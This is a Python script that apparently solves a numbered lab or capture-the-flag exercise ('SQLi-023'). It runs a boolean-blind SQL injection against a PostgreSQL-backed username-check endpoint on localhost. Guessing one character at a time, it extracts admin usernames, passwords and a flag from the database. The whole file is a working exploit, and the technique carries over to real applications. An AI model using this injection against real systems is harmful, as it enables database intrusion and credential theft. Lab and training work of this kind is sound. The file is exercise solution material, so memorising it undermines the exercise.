#!/usr/bin/env python3
"""SQLi-023: PostgreSQL Boolean Blind Exploit"""
import requests
import string

BASE_URL = "http://localhost:5023"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(payload):
    url = f"{BASE_URL}/check?username={requests.utils.quote(payload)}"
    r = requests.get(url, timeout=10)
    return "is taken" in r.text

def extract_string(table, column, max_len=50):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            payload = f"john_doe' AND (SELECT SUBSTRING({column} FROM {pos} FOR 1) FROM {table} LIMIT 1)='{c}'--"
            if check(payload):
                result += c
                print(f"[+] {column}: {result}")
                found = True
                break
        if not found:
            break
    return result

def main():
    print("=" * 50)
    print("SQLi-023: PostgreSQL Boolean Blind Exploit")
    print("=" * 50)
    
    print("\n[*] Extracting admin credentials...")
    username = extract_string("admin_secrets", "username")
    password = extract_string("admin_secrets", "password")
    print(f"\n[+] Credentials: {username}:{password}")
    
    print("\n[*] Extracting flag...")
    flag = extract_string("flags", "value")
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
